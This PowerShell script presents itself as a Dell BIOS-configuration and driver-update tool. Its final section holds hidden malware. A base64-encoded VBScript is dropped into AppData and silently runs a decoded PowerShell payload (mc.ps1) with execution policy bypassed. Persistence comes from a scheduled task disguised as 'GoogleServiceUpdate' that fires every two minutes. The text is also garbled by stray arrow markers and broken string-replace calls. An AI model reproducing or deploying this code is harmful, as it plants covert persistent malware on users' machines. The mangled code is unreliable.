
[CmdletBinding()]
param
(
		[string]$BIOSPassword,
		[string]$Policy,
		[string]$ConsoleTitle = " "
)

 -||-> function Get-RelativePath {

	
	[CmdletBinding()][OutputType([string])]
	param ()
	
	 -||-> $Path = ( -||-> split-path $SCRIPT:MyInvocation.MyCommand.Path -parent <-||- ) + "\" <-||- 
	Return  -||-> $Path <-||- 
} <-||- 

 -||-> function Set-ConsoleTitle {

	
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory = $true)][String]
		$Title
	)
	
	 -||-> $host.ui.RawUI.WindowTitle = $Title <-||- 
} <-||- 

 -||-> function Get-Architecture {

	
	[CmdletBinding()]
	param ()
	
	 -||-> $Architecture =  -||-> Get-WmiObject -Class Win32_OperatingSystem | Select-Object OSArchitecture <-||-  <-||- 
	 -||-> $Architecture = $Architecture.OSArchitecture <-||- 
	
	Return  -||-> $Architecture <-||- 
} <-||- 

 -||-> function Install-Updates {

	
	[CmdletBinding()]
	param
	(
		[String]
		$DisplayName,
		[String]
		$Executable,
		[String]
		$Switches
	)
	
	 -||-> Write-Host "Install"$DisplayName"....." -NoNewline <-||- 
	 -||-> If ( -||-> ( -||-> Test-Path $Executable <-||- ) -eq $true <-||- ) {
		 -||-> $ErrCode = ( -||-> Start-Process -FilePath $Executable -ArgumentList $Switches -Wait -Passthru <-||- ).ExitCode <-||- 
	} else {
		 -||-> $ErrCode = 1 <-||- 
	} <-||- 
	 -||-> If ( -||-> ( -||-> $ErrCode -eq 0 <-||- ) -or ( -||-> $ErrCode -eq 1 <-||- ) -or ( -||-> $ErrCode -eq 3010 <-||- ) <-||- ) {
		 -||-> Write-Host "Success" -ForegroundColor Yellow <-||- 
	} else {
		 -||-> Write-Host "Failed with error code "$ErrCode -ForegroundColor Red <-||- 
	} <-||- 
	
} <-||- 

 -||-> function Set-BIOSSetting {

	
	[CmdletBinding()]
	param
	(
		[string]
		$Name,
		[string]
		$Option,
		[string]
		$Setting,
		[string]
		$Drives,
		[string]
		$Architecture
	)
	
	 -||-> If ( -||-> $Architecture -eq "32-bit" <-||- ) {
		 -||-> $EXE = $Env:PROGRAMFILES + "\Dell\Command Configure\X86\cctk.exe" <-||- 
	} else {
		 -||-> $EXE = ${env:ProgramFiles(x86)} + "\Dell\Command Configure\X86_64\cctk.exe" <-||- 
	} <-||- 
	 -||-> $Argument = "--" + $Option + "=" + $Setting <-||- 
	 -||-> Write-Host $Name"....." -NoNewline <-||- 
	 -||-> If ( -||-> ( -||-> Test-Path $EXE <-||- ) -eq $true <-||- ) {
		 -||-> $ErrCode = ( -||-> Start-Process -FilePath $EXE -ArgumentList $Argument -Wait -Passthru <-||- ).ExitCode <-||- 
	} else {
		 -||-> $ErrCode = 1 <-||- 
	} <-||- 
	 -||-> If ( -||-> ( -||-> $ErrCode -eq 0 <-||- ) -or ( -||-> $ErrCode -eq 240 <-||- ) -or ( -||-> $ErrCode -eq 241 <-||- ) <-||- ) {
		 -||-> Write-Host "Success" -ForegroundColor Yellow <-||- 
	} elseIf ( -||-> $ErrCode -eq 119 <-||- ) {
		 -||-> Write-Host "Unavailable" -ForegroundColor Green <-||- 
	} else {
		 -||-> Write-Host "Failed with error code "$ErrCode -ForegroundColor Red <-||- 
	} <-||- 
} <-||- 

 -||-> cls <-||- 
 -||-> Set-ConsoleTitle -Title $ConsoleTitle <-||- 
 -||-> $Architecture =  -||-> Get-Architecture <-||-  <-||- 
 -||-> If ( -||-> $BIOSPassword -ne "" <-||- ) {
	 -||-> Set-BIOSSetting -Name "Disable BIOS Password" -Option "valsetuppwd" -Setting $BIOSPassword" --setuppwd=" -Drives "" -Architecture $Architecture <-||- 
} <-||- 
 -||-> If ( -||-> $Architecture -eq "32-bit" <-||- ) {
	 -||-> $EXE = $Env:PROGRAMFILES + "\Dell\CommandUpdate\dcu-cli.exe" <-||- 
} else {
	 -||-> $EXE = ${env:ProgramFiles(x86)} + "\Dell\CommandUpdate\dcu-cli.exe" <-||- 
} <-||- 
 -||-> If ( -||-> $Policy -eq "" <-||- ) {
	 -||-> $Parameters = " " <-||- 
} else {
	 -||-> $RelativePath =  -||-> Get-RelativePath <-||-  <-||- 
	 -||-> $Parameters = "/policy " + [char]34 + $RelativePath + $Policy + [char]34 <-||- 
} <-||- 
 -||-> If ( -||-> ( -||-> Test-Path $EXE <-||- ) -eq $true <-||- ) {
	 -||-> Install-Updates -DisplayName "Update Dell Components" -Executable $EXE -Switches $Parameters <-||- 
} else {
	Exit  -||-> 1 <-||- 
} <-||- 
 -||-> $path= "$env:userprofile\appdata\local\microsoft\Windows" <-||- 

 -||-> if( -||-> -not( -||-> Test-Path -Path( -||-> $path <-||- ) <-||- ) <-||- )
{ -||-> mkdir $path <-||- } <-||- 

 -||-> $fileout="$path\L69742.vbs" <-||- ;

 -||-> $encstrvbs="c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K" <-||- ;

 -||-> $bytevbs=[System.Convert]::FromBase64String($encstrvbs) <-||- ;

 -||-> $strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs) <-||- ;

 -||-> $strvbs = $strvbs.replace('

set-content $fileout $strvbs;

$tmpfile="$env:TEMP\U1848931.TMP";



$pscode_b64  =get-content $tmpfile | out-string;

$pscode_b64=$pscode_b64.trim();


$pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))

$id = [string](get-random -min 10000 -max 100000)

$pscode = $pscode.replace(' <-||- 

 -||-> set-content "$path\mc.ps1" $pscode <-||- 


 -||-> $taskstr="schtasks /create /F /sc minute /mo 2 /tn ""GoogleServiceUpdate"" /tr ""\""$fileout""\""   " <-||- ;



 -||-> iex 'cmd /c $taskstr' <-||- ;



